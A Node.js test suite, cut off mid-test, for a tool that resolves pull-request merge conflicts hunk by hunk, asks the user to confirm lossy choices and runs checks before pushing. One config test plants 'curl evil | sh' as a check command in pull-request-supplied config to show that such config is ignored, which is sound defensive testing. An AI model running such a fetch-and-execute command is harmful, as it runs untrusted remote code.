import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { makeApp, git, write, commit, sha, setConfig, prStub, pushTo, GIT_ENV, MERGED, COMBINED, LOCK_COMMAND, CALLER_GATE } from './fixture.mjs';

const root = mkdtempSync(join(tmpdir(), 'mc-state-'));
Object.assign(process.env, GIT_ENV);
process.env.SOLVE_CONFLICTS_STATE_DIR = join(root, 'solve');
// Never this machine's real calibration file.
process.env.REAL_SKILLS_CALIBRATION_DIR = join(root, 'calibration');
delete process.env.REAL_SKILLS_CALIBRATION;
delete process.env.SOLVE_CONFLICTS_TEST_CALIBRATED;
delete process.env.SOLVE_CONFLICTS_JEV_STUB;
process.env.SOLVE_CONFLICTS_JEV = 'off';

const H = await import('../solve.mjs');
const S = await import('../lib/state.mjs');
const C = await import('../lib/calibration.mjs');
const GIT = await import('../lib/git.mjs');
const { loadConfig } = await import('../lib/config.mjs');

const use = (app) => {
  process.env.SOLVE_CONFLICTS_GH_STUB = app.stubFile;
  return app;
};
const status = (r) => Object.fromEntries(Object.entries(r.gates).map(([k, v]) => [k, v.status]));
const read = (app, run, file) => readFileSync(join(S.loadRun(run).worktree, file), 'utf8');

// start and open on pull request #7. -> { app, run, o, by: { "<file>": conflict } }
function opened(prefix, opts, ...args) {
  const app = use(makeApp(prefix, opts));
  const s = H.start({ repo: app.repo, args: ['7', ...args] });
  const o = H.open({ run: s.run_id });
  return { app, run: s.run_id, s, o, by: Object.fromEntries(o.conflicts.map((c) => [c.file, c])) };
}
// One commit per side that has any: a path that exists on one side only has no history on the other.
const cite = (c) => ({ pr: c.sources.pr_side.slice(0, 1).map((x) => x.sha), base: c.sources.base_side.slice(0, 1).map((x) => x.sha) });
const res = (t, id, c, kind, extra = {}) => H.resolve({ run: t.run, id, kind, why: `${kind}: both intents read`, sources: cite(c), ...extra });
const yes = (t, id) => H.decide({ run: t.run, id, confirmed: true });
// Every conflict resolved the right way, every question answered.
function solveAll(t, { skip = [] } = {}) {
  const { by } = t;
  const price = by['src/price.ts'];
  if (!skip.includes('h1')) res(t, price.hunks[0].id, price, 'both', { first: 'pr' });
  if (!skip.includes('h2')) res(t, price.hunks[1].id, price, 'combined', { text: COMBINED });
  if (!skip.includes('doc')) {
    res(t, by['docs/old.md'].id, by['docs/old.md'], 'delete');
    yes(t, by['docs/old.md'].id);
  }
  if (!skip.includes('logo')) {
    res(t, by['img/logo.bin'].id, by['img/logo.bin'], 'base');
    yes(t, by['img/logo.bin'].id);
  }
}

// ---------------------------------------------------------------- config
test('config: own keys, then the other skills\' check commands; never a path as a lockfile key', () => {
  const app = makeApp('mc-cfg-', { config: null });
  assert.deepEqual(loadConfig(app.repo).config.gates, []);
  setConfig(app.repo, { verify: 'pnpm check && pnpm test' }, 'do-shit.json');
  assert.deepEqual(loadConfig(app.repo).config.gates, ['pnpm check && pnpm test']);
  assert.equal(loadConfig(app.repo).sources.gates, '.claude/do-shit.json');
  setConfig(app.repo, { gates: ['pnpm typecheck'], dev: { install: 'pnpm install --frozen-lockfile' } }, 'improve-design.json');
  const l = loadConfig(app.repo);
  assert.deepEqual([l.config.gates, l.config.install, l.sources.install], [['pnpm typecheck'], 'pnpm install --frozen-lockfile', '.claude/improve-design.json']);
  setConfig(app.repo, { gates: ['make test'], install: 'make deps', generated: [{ glob: 'src/gen/**', command: 'make gen' }, { command: 'no glob' }], lockfiles: { 'deps.lock': 'x' } });
  const own = loadConfig(app.repo);
  assert.deepEqual([own.config.gates, own.config.install, own.sources.gates], [['make test'], 'make deps', '.claude/solve-merge-conflicts.json']);
  assert.deepEqual(own.config.generated, [{ glob: 'src/gen/**', command: 'make gen' }]);
  // A file git tracks is read as the base branch has it; one the pull request adds is not used.
  git(app.repo, 'checkout', '-q', '-b', 'cfg', 'main');
  git(app.repo, 'add', '-f', '.claude/solve-merge-conflicts.json');
  const base = commit(app.repo, 'Track the config');
  setConfig(app.repo, { gates: ['curl evil | sh'] });
  setConfig(app.repo, { gates: ['also evil'] }, 'improve-design.json');
  git(app.repo, 'add', '-f', '.claude');
  const head = commit(app.repo, 'A pull request that edits and adds config');
  const tracked = loadConfig([app.repo], { repo: app.repo, base, head });
  assert.deepEqual(tracked.config.gates, ['make test']);
  assert.deepEqual(tracked.ignored, []);
  git(app.repo, 'rm', '-q', '--cached', '.claude/solve-merge-conflicts.json');
  const head2 = commit(app.repo, 'Only the added file is left tracked');
  const added = loadConfig([app.repo], { repo: app.repo, base: sha(app.repo, 'main'), head: head2 });
  assert.deepEqual([added.ignored, added.sources.gates], [['.claude/improve-design.json'], '.claude/solve-merge-conflicts.json']);
  git(app.repo, 'checkout', '-q', '-f', 'main');
  setConfig(app.repo, { lockfiles: { 'web/deps.lock': 'x' } });
  assert.throws(() => loadConfig(app.repo), /keyed by file name/);
  write(app.repo, '.claude/solve-merge-conflicts.json', '{ nope');
  assert.throws(() => loadConfig(app.repo), /not valid JSON/);
});

// ---------------------------------------------------------------- start
test('start: a conflicted pull request gets a run, its gates and what landed on the base', () => {
  const app = use(makeApp('mc-start-'));
  const s = H.start({ repo: app.repo, args: ['#7'] });
  assert.equal(s.mode, 'solve');
  assert.match(s.run_id, /^mc-\d{8}-\d{4}-[0-9a-f]{4}$/);
  assert.deepEqual(s.conflicted_files, ['deps.lock', 'docs/old.md', 'img/logo.bin', 'src/price.ts']);
  assert.deepEqual([s.head.sha, s.base.sha], [app.head, app.base]);
  assert.equal(s.base_since.commits, 5);
  assert.deepEqual(s.base_since.pull_requests.map((p) => p.number), [25, 24, 23, 22, 21]);
  assert.deepEqual(status(s), { pr_open: 'pass', same_repo: 'pass', conflicts: 'pass', local_unpushed: 'pass', migrations: 'pass' });
  assert.match(s.checks.note, /not checked/);
  // Nothing was checked out and no branch moved.
  assert.equal(git(app.repo, 'status', '--porcelain'), '');
  assert.equal(sha(app.repo, 'main'), app.base);
  // A link works; another repository's link does not.
  assert.equal(H.start({ repo: app.repo, args: ['https://github.com/acme/app/pull/7/files'] }).mode, 'solve');
  assert.throws(() => H.start({ repo: app.repo, args: ['https://github.com/other/app/pull/7'] }), /belongs to other\/app/);
  assert.throws(() => H.start({ repo: app.repo, args: ['feat'] }), /not a pull request number or link/);
  assert.throws(() => H.start({ repo: app.repo, args: ['7', '8'] }), /one pull request per run/);
  assert.throws(() => H.start({ repo: app.repo, args: ['7', '--rebase'] }), /unknown flag --rebase/);
  assert.throws(() => H.start({ repo: app.repo, args: ['99'] }), /no pull request #99/);
});

test('start: closed, fork, a head GitHub and the fetch disagree on, and a clean pull request', () => {
  const app = use(makeApp('mc-block-'));
  app.setStub({ prs: { 7: prStub(app.head, { state: 'MERGED' }) } });
  let s = H.start({ repo: app.repo, args: ['7'] });
  assert.deepEqual([s.verdict, s.blocking], ['blocked', ['pr_open']]);
  app.setStub({ prs: { 7: prStub(app.head, { isCrossRepository: true }) } });
  s = H.start({ repo: app.repo, args: ['7'] });
  assert.deepEqual([s.verdict, s.blocking], ['blocked', ['same_repo']]);
  assert.equal(s.run_id, undefined);
  app.setStub({ prs: { 7: prStub('0'.repeat(40)) } });
  s = H.start({ repo: app.repo, args: ['7'] });
  assert.deepEqual([s.verdict, s.blocking], ['blocked', ['head_unchanged']]);

  git(app.repo, 'checkout', '-q', '-b', 'tidy', 'main');
  write(app.repo, 'README.md', 'hello\n');
  const tidy = commit(app.repo, 'Add a readme');
  git(app.repo, 'push', '-q', 'origin', 'tidy');
  git(app.repo, 'checkout', '-q', 'main');
  app.setStub({ prs: { 8: prStub(tidy, { number: 8, headRefName: 'tidy', mergeable: 'MERGEABLE' }) }, current_pr: 8, mine: [prStub(app.head), prStub(tidy, { number: 8, mergeable: 'MERGEABLE' })] });
  s = H.start({ repo: app.repo, args: [] });
  assert.equal(s.verdict, 'nothing_to_solve');
  // Asked for nothing, and the branch's own pull request is clean: the conflicting ones are offered.
  assert.deepEqual(s.candidates.map((p) => p.number), [7]);
});

test('start: no argument and no pull request for the branch asks, with candidates', () => {
  const app = use(makeApp('mc-input-'));
  app.setStub({ mine: [prStub(app.head), prStub(app.head, { number: 9, mergeable: 'MERGEABLE' }), prStub(app.head, { number: 10, isCrossRepository: true })] });
  const s = H.start({ repo: app.repo, args: [] });
  assert.deepEqual(s.needs, ['input']);
  assert.deepEqual(s.candidates.map((p) => p.number), [7]);
  assert.match(s.next, /Never pick/);
});

test('start: local commits the pull request lacks, and a migration on both sides, are said', () => {
  const app = use(makeApp('mc-warn-'));
  git(app.repo, 'checkout', '-q', 'feat');
  write(app.repo, 'db/migrations/0002_b.sql', 'select 2;\n');
  const head = commit(app.repo, 'Add a migration');
  git(app.repo, 'push', '-q', 'origin', 'feat');
  write(app.repo, 'notes.md', 'local only\n');
  commit(app.repo, 'Not pushed');
  git(app.repo, 'checkout', '-q', 'main');
  pushTo(app, 'main', { 'db/migrations/0002_a.sql': 'select 1;\n' }, 'Another migration (#30)');
  app.setStub({ prs: { 7: prStub(head) } });
  const s = H.start({ repo: app.repo, args: ['7'] });
  assert.deepEqual(s.warnings, ['local_unpushed', 'migrations']);
  assert.match(s.gates.local_unpushed.text, /holds 1 commit the pull request lacks/);
  assert.match(s.gates.migrations.text, /check-infra-and-migrations/);
});

test('start: with several remotes and none for this repository, nothing runs', () => {
  const app = use(makeApp('mc-remote-'));
  git(app.repo, 'remote', 'add', 'fork', app.remote);
  assert.throws(() => H.start({ repo: app.repo, args: ['7'] }), /no git remote of this checkout points at acme\/app, and there are several/);
  // Matched on owner/name, whatever the host is written as.
  git(app.repo, 'remote', 'set-url', 'fork', 'git@gh-work:me/app.git');
  git(app.repo, 'remote', 'add', 'upstream', 'git@gh-work:Acme/App.git');
  assert.equal(GIT.remoteFor(app.repo, 'acme/app'), 'upstream');
  git(app.repo, 'remote', 'set-url', 'upstream', 'https://github.com/acme/app-two');
  assert.equal(GIT.remoteFor(app.repo, 'acme/app'), null);
  git(app.repo, 'remote', 'remove', 'fork');
  git(app.repo, 'remote', 'remove', 'upstream');
  assert.equal(GIT.remoteFor(app.repo, 'acme/app'), 'origin');
});

// ---------------------------------------------------------------- open
test('open: a worktree at the head, every conflict with its class, hunks and sources', () => {
  const { app, o, by, run } = opened('mc-open-');
  assert.deepEqual(o.conflicts.map((c) => [c.file, c.class]), [['deps.lock', 'lockfile'], ['docs/old.md', 'modify_delete'], ['img/logo.bin', 'binary'], ['src/price.ts', 'content']]);
  assert.ok(o.worktree.endsWith(`/.claude/worktrees/${run}`));
  assert.equal(git(o.worktree, 'rev-parse', 'HEAD'), app.head);
  assert.equal(git(app.repo, 'status', '--porcelain'), '');
  const price = by['src/price.ts'];
  assert.equal(price.hunks.length, 2);
  assert.deepEqual([price.hunks[0].pr, price.hunks[0].origin, price.hunks[0].base], ['import tax from "tax";\n', '', 'import log from "log";\n']);
  assert.equal(price.hunks[1].id, `${price.id}.h2`);
  assert.deepEqual(price.sources.base_side.map((c) => c.pr.number), [21]);
  assert.equal(price.sources.pr_side[0].subject, 'Add regional pricing');
  assert.equal(by['docs/old.md'].changed_by, 'pr');
  // The lockfile is the script's: the base's copy now, its command at check.
  assert.deepEqual([by['deps.lock'].resolution, by['deps.lock'].command], ['regenerate', LOCK_COMMAND]);
  assert.match(read(app, run, 'deps.lock'), /^a b c /);
  // The working file carries the hunks the run numbers.
  assert.match(read(app, run, 'src/price.ts'), /^<<<<<<< pr$/m);
  assert.deepEqual(o.unresolved, [by['docs/old.md'].id, by['img/logo.bin'].id, price.hunks[0].id, price.hunks[1].id]);
  assert.ok(o.git_said.some((l) => /CONFLICT \(modify\/delete\)/.test(l)));
  // Calling it again changes nothing.
  assert.deepEqual(H.open({ run }).conflicts.map((c) => c.id), o.conflicts.map((c) => c.id));
});

test('open: a generated file with no command, a file both sides added, and a rename on both sides', async () => {
  const app = use(makeApp('mc-classes-', { config: { lockfiles: { 'deps.lock': LOCK_COMMAND }, generated: [{ glob: 'src/gen/**' }] } }));
  const deps = readFileSync(join(app.repo, 'deps.txt'), 'utf8');
  pushTo(app, 'main', { 'src/gen/api.ts': 'base\n', 'src/new.ts': 'export const b = 2;\n' }, 'Generated client and a new file (#31)');
  pushTo(app, 'main', { 'deps.txt': null, 'requirements.txt': deps }, 'Rename deps.txt (#32)');
  pushTo(app, 'feat', { 'src/gen/api.ts': 'pr\n', 'src/new.ts': 'export const a = 1;\n' }, 'Generated client and a new file');
  const head = pushTo(app, 'feat', { 'deps.txt': null, 'packages.txt': deps }, 'Rename deps.txt');
  app.setStub({ prs: { 7: prStub(head) } });
  const s = H.start({ repo: app.repo, args: ['7'] });
  const o = H.open({ run: s.run_id });
  const by = Object.fromEntries(o.conflicts.map((c) => [c.file, c]));
  const t = { app, run: s.run_id, by };
  // No command to write it again: one side is taken, and that is asked.
  assert.deepEqual([by['src/gen/api.ts'].class, by['src/gen/api.ts'].resolution], ['generated', undefined]);
  assert.throws(() => H.resolve({ run: t.run, id: by['src/gen/api.ts'].id, kind: 'regenerate' }), /no command is configured to write src\/gen\/api\.ts again/);
  assert.match(res(t, by['src/gen/api.ts'].id, by['src/gen/api.ts'], 'base').ask, /whole file is taken from the base/);
  // Both added it: one hunk, nothing they both started from.
  assert.deepEqual([by['src/new.ts'].class, by['src/new.ts'].hunks.length, by['src/new.ts'].hunks[0].origin], ['content', 1, '']);
  assert.equal(res(t, by['src/new.ts'].hunks[0].id, by['src/new.ts'], 'both', { first: 'pr' }).needs_decision, false);
  // A rename on both sides: the old path is gone by itself, each new path is a call for the user.
  const moved = o.conflicts.filter((c) => c.class === 'structural').map((c) => [c.file, c.exists_on, c.resolution]);
  assert.deepEqual(moved, [['deps.txt', null, 'delete'], ['packages.txt', 'pr', undefined], ['requirements.txt', 'base', undefined]]);
  assert.throws(() => res(t, by['deps.txt'].id, by['deps.txt'], 'keep'), /exists on neither side/);
  assert.match(res(t, by['requirements.txt'].id, by['requirements.txt'], 'keep').ask, /only on the base's side/);
  assert.match(res(t, by['packages.txt'].id, by['packages.txt'], 'delete').ask, /only on the pull request's side/);
  assert.equal(existsSync(join(o.worktree, 'packages.txt')), false);
  assert.ok(o.git_said.some((l) => /rename\/rename/.test(l)));
});

test('open: a symbolic link in conflict is never written through, and blocks the run', async () => {
  const app = use(makeApp('mc-link-'));
  const outside = join(app.tmp, 'outside.txt');
  writeFileSync(outside, 'untouched\n');
  pushTo(app, 'main', {}, 'A link (#33)', { links: { 'current': 'src/util.ts' } });
  const head = pushTo(app, 'feat', {}, 'A link', { links: { 'current': outside } });
  app.setStub({ prs: { 7: prStub(head) } });
  const s = H.start({ repo: app.repo, args: ['7'] });
  const o = H.open({ run: s.run_id });
  const link = o.conflicts.find((c) => c.file === 'current');
  assert.match(link.unsupported, /a symbolic link/);
  assert.equal(o.verdict, 'blocked');
  assert.throws(() => H.resolve({ run: s.run_id, id: link.hunks ? link.hunks[0].id : link.id, kind: 'pr', why: 'x' }), /a symbolic link/);
  assert.equal(readFileSync(outside, 'utf8'), 'untouched\n');
  assert.equal((await H.check({ run: s.run_id })).verdict, 'blocked');
});

test('open: a file taken from one side gets that side\'s mode', async () => {
  const app = use(makeApp('mc-mode-'));
  pushTo(app, 'main', {}, 'Make it executable (#34)', { exec: ['img/logo.bin'] });
  const t = { app, run: H.start({ repo: app.repo, args: ['7'] }).run_id };
  t.by = Object.fromEntries(H.open({ run: t.run }).conflicts.map((c) => [c.file, c]));
  solveAll(t);
  const c = await H.check({ run: t.run });
  assert.match(git(app.repo, 'ls-tree', c.commit, 'img/logo.bin'), /^100755 /);
});

// ---------------------------------------------------------------- resolve, decide
test('resolve: the script writes the file, hunk by hunk', () => {
  const t = opened('mc-res-');
  const price = t.by['src/price.ts'];
  let r = res(t, price.hunks[0].id, price, 'both', { first: 'pr' });
  assert.deepEqual([r.needs_decision, r.written], [false, true]);
  assert.match(read(t.app, t.run, 'src/price.ts'), /import tax from "tax";\nimport log from "log";\n\n<<<<<<< pr\n/);
  r = res(t, price.hunks[1].id, price, 'combined', { text: COMBINED });
  assert.equal(r.needs_decision, false);
  assert.equal(read(t.app, t.run, 'src/price.ts'), MERGED);
  // Resolved again: the file is rebuilt from the conflicted copy.
  res(t, price.hunks[0].id, price, 'both', { first: 'base' });
  assert.match(read(t.app, t.run, 'src/price.ts'), /import log from "log";\nimport tax from "tax";\n/);
});

test('resolve: what it refuses', () => {
  const t = opened('mc-refuse-');
  const price = t.by['src/price.ts'];
  const h1 = price.hunks[0].id;
  assert.throws(() => H.resolve({ run: t.run, id: h1, kind: 'both', first: 'pr', why: 'x', sources: { pr: [], base: cite(price).base } }), /no commit cited from the pull request's side/);
  assert.throws(() => H.resolve({ run: t.run, id: h1, kind: 'both', first: 'pr', why: 'x', sources: { pr: cite(price).pr, base: [t.s.merge_base] } }), /is not one of the base's commits/);
  // A commit of the base's range that never touched this file.
  assert.throws(() => H.resolve({ run: t.run, id: h1, kind: 'both', first: 'pr', why: 'x', sources: { pr: cite(price).pr, base: cite(t.by['img/logo.bin']).base } }), /did not change src\/price\.ts/);
  assert.throws(() => H.resolve({ run: t.run, id: h1, kind: 'both', first: 'pr', why: 'x', sources: { pr: ['zzzzzzz'], base: cite(price).base } }), /is not a commit/);
  assert.throws(() => res(t, h1, price, 'both'), /`first` is missing/);
  assert.throws(() => res(t, h1, price, 'combined'), /`text` is missing/);
  assert.throws(() => res(t, h1, price, 'combined', { text: '<<<<<<< pr\nx\n' }), /contains a conflict marker/);
  assert.throws(() => res(t, h1, price, 'keep'), /a content conflict is resolved as one of both, combined, pr, base/);
  assert.throws(() => H.resolve({ run: t.run, id: h1, kind: 'pr', sources: cite(price) }), /`why` is missing/);
  assert.throws(() => res(t, price.id, price, 'pr'), /resolved hunk by hunk/);
  assert.throws(() => res(t, `${t.by['img/logo.bin'].id}.h1`, t.by['img/logo.bin'], 'pr'), /resolved as a whole/);
  assert.throws(() => res(t, 'c99', price, 'pr'), /no conflict c99/);
  assert.throws(() => res(t, t.by['docs/old.md'].id, t.by['docs/old.md'], 'port', { to: '../elsewhere.md' }), /not a path inside the repository/);
  assert.throws(() => H.resolve({ run: 'mc-00000000-0000-0000', id: h1 }), /unknown run/);
  assert.throws(() => H.resolve({ run: '../x', id: h1 }), /unknown run/);
});

test('resolve: one side giving way is asked; decide needs a yes and is void once the resolution changes', async () => {
  const t = opened('mc-ask-');
  const price = t.by['src/price.ts'];
  const [h1, h2] = price.hunks.map((h) => h.id);
  // Both sides only added lines here: taking one drops the other's.
  let r = res(t, h1, price, 'pr');
  assert.equal(r.needs_decision, true);
  assert.match(r.ask, /what the base did to these lines is dropped/);
  // Both changed the same lines: writing both keeps two versions.
  r = res(t, h2, price, 'both', { first: 'pr' });
  assert.match(r.ask, /two versions/);
  // The combined text lost a name one side added.
  r = res(t, h2, price, 'combined', { text: 'export function price(amount) {\n  return amount * 2;\n' });
  assert.match(r.ask, /leaves out `region`/);
  assert.deepEqual(r.asks.map((a) => a.id), [h1, h2]);

  assert.match(H.decide({ run: t.run, id: h1 }).refused, /needs --confirmed/);
  assert.deepEqual(yes(t, h1).asks.map((a) => a.id), [h2]);
  // The answer was for that resolution. A new one is a new question.
  r = res(t, h1, price, 'base');
  assert.equal(r.needs_decision, true);
  assert.throws(() => yes(t, t.by['deps.lock'].id), /nothing is asked/);

  // Whole files: every choice that drops a side is asked.
  r = res(t, t.by['docs/old.md'].id, t.by['docs/old.md'], 'keep');
  assert.match(r.ask, /keeping it undoes the deletion/);
  assert.equal(read(t.app, t.run, 'docs/old.md'), 'old doc\nwith a new paragraph\n');
  r = res(t, t.by['docs/old.md'].id, t.by['docs/old.md'], 'delete');
  assert.match(r.ask, /deleting it drops that change/);
  assert.equal(existsSync(join(S.loadRun(t.run).worktree, 'docs/old.md')), false);
  r = res(t, t.by['img/logo.bin'].id, t.by['img/logo.bin'], 'base');
  assert.match(r.ask, /whole file is taken from the base/);
  assert.deepEqual([...readFileSync(join(S.loadRun(t.run).worktree, 'img/logo.bin'))], [0, 7, 7, 7]);
  r = res(t, t.by['deps.lock'].id, t.by['deps.lock'], 'pr');
  assert.match(r.ask, /whole file is taken from the pull request/);
  assert.equal(H.resolve({ run: t.run, id: t.by['deps.lock'].id, kind: 'regenerate' }).needs_decision, false);

  const c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'needs_decision');
  assert.deepEqual(c.blocking, ['decisions']);
  assert.deepEqual(c.asks.map((a) => a.id).sort(), [t.by['docs/old.md'].id, t.by['img/logo.bin'].id, h1, h2].sort());
  assert.equal(c.commit, undefined);
});

// ---------------------------------------------------------------- check
test('check: unresolved conflicts stop it before anything is committed or run', async () => {
  const t = opened('mc-unres-', { config: { lockfiles: { 'deps.lock': LOCK_COMMAND }, gates: ['touch ran.flag'] } });
  solveAll(t, { skip: ['h2'] });
  const c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'needs_decision');
  assert.deepEqual(c.unresolved, [t.by['src/price.ts'].hunks[1].id]);
  assert.equal(existsSync(join(S.loadRun(t.run).worktree, 'ran.flag')), false);
  assert.match(H.push({ run: t.run, confirmed: true }).refused, /nothing was checked yet/);
});

test('check: everything resolved and no check command is resolved_unverified, with a two-parent commit', async () => {
  const t = opened('mc-unver-');
  solveAll(t);
  const c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'resolved_unverified');
  assert.deepEqual(c.unknown, ['checks']);
  assert.match(c.ask, /^Push one merge commit \([0-9a-f]{7}\) to feat, the branch of pull request #7\? It adds main to the branch and rewrites nothing\. The result was not checked\.$/);
  assert.deepEqual(git(t.app.repo, 'rev-list', '--parents', '-n', '1', c.commit).split(' ').slice(1), [t.app.head, t.app.base]);
  assert.equal(git(t.app.repo, 'show', `${c.commit}:src/price.ts`), MERGED.trimEnd());
  // The lockfile was written by its command, after the hunks: it holds both sides' dependencies.
  assert.equal(git(t.app.repo, 'show', `${c.commit}:deps.lock`), 'a b c d e f g h i j z');
  assert.equal(git(t.app.repo, 'ls-tree', '-r', '--name-only', c.commit).includes('docs/old.md'), false);
  const message = git(t.app.repo, 'log', '-n', '1', '--format=%B', c.commit);
  assert.match(message, /^Merge main into feat\n\nConflicts resolved with \/real-skills:solve-merge-conflicts:\n/);
  assert.match(message, /- src\/price\.ts \(line \d+\): combined both sides\. combined: both intents read/);
  assert.match(message, /- docs\/old\.md: deleted the file\./);
  // HEAD of the worktree did not move, and neither did any branch.
  assert.equal(git(S.loadRun(t.run).worktree, 'rev-parse', 'HEAD'), t.app.head);
  assert.equal(sha(t.app.repo, 'feat'), t.app.head);
  const rows = Object.fromEntries(c.summary.resolutions.map((r) => [r.id, r]));
  assert.equal(rows[t.by['src/price.ts'].hunks[1].id].text, COMBINED);
  assert.equal(rows[t.by['docs/old.md'].id].asked, true);
  assert.equal(rows[t.by['src/price.ts'].hunks[0].id].asked, false);
  assert.deepEqual(c.summary.regenerated, ['deps.lock']);
  const log = S.readLog().filter((e) => e.run === t.run).pop();
  assert.deepEqual([log.verdict, log.resolutions, log.asked, log.kinds.combined], ['resolved_unverified', 5, 2, 1]);
  assert.ok(!JSON.stringify(log).includes('amount'));
});

test('check: an edit outside the conflicts must be listed, with a commit of one of the sides', async () => {
  const t = opened('mc-edit-', { config: { lockfiles: { 'deps.lock': LOCK_COMMAND }, gates: [CALLER_GATE] } });
  solveAll(t);
  // The merge is clean in src/caller.ts and broken: the base renamed what it calls.
  let c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'checks_failed');
  assert.deepEqual(c.blocking, ['checks']);
  assert.equal(c.checks.results[0].before, 'green');
  assert.equal(c.ask, undefined);
  assert.match(H.push({ run: t.run, confirmed: true }).refused, /turned a check red/);
  assert.equal(existsSync(`${S.loadRun(t.run).worktree}-before`), false);

  const wt = S.loadRun(t.run).worktree;
  write(wt, 'src/caller.ts', 'import { assist } from "./util";\nexport const x = assist();\n');
  c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'needs_decision');
  assert.deepEqual([c.blocking, c.unlisted], [['outside_edits'], ['src/caller.ts']]);
  const { rename } = t.app;
  c = await H.check({ run: t.run, edits: [{ file: 'src/caller.ts', why: 'helper was renamed to assist', source: t.s.merge_base }] });
  assert.match(c.problems[0], /not a commit of either side/);
  c = await H.check({ run: t.run, edits: [{ file: 'src/caller.ts', why: 'helper was renamed to assist', source: rename }, { file: 'src/util.ts', why: 'x', source: rename }] });
  assert.match(c.problems[0], /src\/util\.ts is listed as an edit and is unchanged/);
  c = await H.check({ run: t.run, edits: [{ file: 'src/caller.ts', why: 'helper was renamed to assist', source: rename }] });
  assert.equal(c.verdict, 'resolved');
  assert.deepEqual(status(c), { head_unchanged: 'pass', decisions: 'pass', outside_edits: 'warn', checks: 'pass' });
  assert.equal(c.summary.edits[0].file, 'src/caller.ts');
  assert.match(git(t.app.repo, 'log', '-n', '1', '--format=%B', c.commit), /Adapted outside the conflicts:\n- src\/caller\.ts: helper was renamed to assist/);
  assert.match(c.restate.join(' '), /1 file edited outside the conflicts/);

  // An edit inside a conflicted file, beyond its hunks, is an edit too.
  write(wt, 'src/price.ts', MERGED.replace('LIMIT = 10', 'LIMIT = 11'));
  c = await H.check({ run: t.run, edits: [{ file: 'src/caller.ts', why: 'helper was renamed to assist', source: rename }] });
  assert.deepEqual(c.unlisted, ['src/price.ts']);
  // So is a file resolved as one side's and then changed by hand.
  write(wt, 'src/price.ts', MERGED);
  write(wt, 'img/logo.bin', Buffer.from([0, 5]));
  c = await H.check({ run: t.run, edits: [{ file: 'src/caller.ts', why: 'helper was renamed to assist', source: rename }] });
  assert.deepEqual(c.unlisted, ['img/logo.bin']);
});

test('check: a check already red on the pull request head is a warning; one that could not be compared is not a pass', async () => {
  const t = opened('mc-red-', { config: { lockfiles: { 'deps.lock': LOCK_COMMAND }, gates: ['test -e never-there', 'true'] } });
  solveAll(t);
  let c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'resolved');
  assert.deepEqual(c.warnings, ['checks']);
  assert.match(c.gates.checks.text, /already was on the pull request head: not the merge's doing/);
  assert.deepEqual(c.checks.results.map((r) => [r.ok, r.before]), [[false, 'red'], [true, undefined]]);
  assert.ok(c.ask);

  // An install that fails on the head too: nothing could be checked.
  setConfig(t.app.repo, { lockfiles: { 'deps.lock': LOCK_COMMAND }, install: 'false', gates: ['true'] });
  c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'resolved_unverified');
  assert.deepEqual([c.unknown, c.checks.not_run], [['checks'], ['true']]);
  // An install the merge broke.
  setConfig(t.app.repo, { lockfiles: { 'deps.lock': LOCK_COMMAND }, install: 'test ! -e src/util.ts || ! grep -q assist src/util.ts', gates: ['true'] });
  c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'checks_failed');
});

test('check: the checks run on the commit, in a worktree of their own, and an install alone checks nothing', async () => {
  // A check that leaves a file behind, as a coverage run does.
  const t = opened('mc-own-', { config: { lockfiles: { 'deps.lock': LOCK_COMMAND }, install: 'true', gates: ['echo out > coverage.txt && test -e src/price.ts'] } });
  solveAll(t);
  let c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'resolved');
  assert.match(c.gates.checks.text, /^1 check green$/);
  const wt = S.loadRun(t.run).worktree;
  assert.equal(existsSync(join(wt, 'coverage.txt')), false);
  assert.equal(existsSync(join(`${wt}-check`, 'coverage.txt')), true);
  assert.equal(git(`${wt}-check`, 'rev-parse', 'HEAD'), c.commit);
  // A second check moves that worktree to the new commit, and lists nothing the check wrote.
  c = await H.check({ run: t.run });
  assert.deepEqual([c.verdict, c.summary.edits], ['resolved', []]);
  assert.equal(git(t.app.repo, 'ls-tree', '-r', '--name-only', c.commit).includes('coverage.txt'), false);
  t.app.patchStub({ prs: { 7: prStub(t.app.head) } });
  assert.equal(H.push({ run: t.run, confirmed: true }).pushed, true);
  assert.equal(existsSync(`${wt}-check`), false);

  const only = opened('mc-install-', { config: { lockfiles: { 'deps.lock': LOCK_COMMAND }, install: 'true' } });
  solveAll(only);
  c = await H.check({ run: only.run });
  assert.deepEqual([c.verdict, c.unknown], ['resolved_unverified', ['checks']]);
});

test('check: a file a lockfile command wrote is the command\'s, until a hand changes it', async () => {
  const t = opened('mc-wrote-', { config: { lockfiles: { 'deps.lock': `${LOCK_COMMAND} && (test -e deps.sum || echo tidy > deps.sum)` } } });
  solveAll(t);
  let c = await H.check({ run: t.run });
  assert.deepEqual([c.verdict, c.summary.regenerated], ['resolved_unverified', ['deps.lock', 'deps.sum']]);
  c = await H.check({ run: t.run });
  assert.deepEqual(c.summary.regenerated, ['deps.lock', 'deps.sum']);
  // The command leaves it alone now, and someone changed it: an edit like any other.
  write(S.loadRun(t.run).worktree, 'deps.sum', 'by hand\n');
  c = await H.check({ run: t.run });
  assert.deepEqual([c.verdict, c.unlisted], ['needs_decision', ['deps.sum']]);
});

test('check: a lockfile command that fails hands the file back to be decided', async () => {
  const t = opened('mc-lock-', { config: { lockfiles: { 'deps.lock': 'exit 3' } } });
  solveAll(t);
  const c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'needs_decision');
  assert.deepEqual(c.unresolved, [t.by['deps.lock'].id]);
  assert.equal(c.regenerate_failed[0].exit, 3);
  const r = res(t, t.by['deps.lock'].id, t.by['deps.lock'], 'base');
  assert.equal(r.needs_decision, true);
  yes(t, t.by['deps.lock'].id);
  assert.equal((await H.check({ run: t.run })).verdict, 'resolved_unverified');
});

test('check: a file carried elsewhere needs the other file to have changed', async () => {
  const t = opened('mc-port-');
  solveAll(t, { skip: ['doc'] });
  const doc = t.by['docs/old.md'];
  const r = res(t, doc.id, doc, 'port', { to: 'docs/new.md' });
  // git could not see where the file went, so where its change belongs is the user's call.
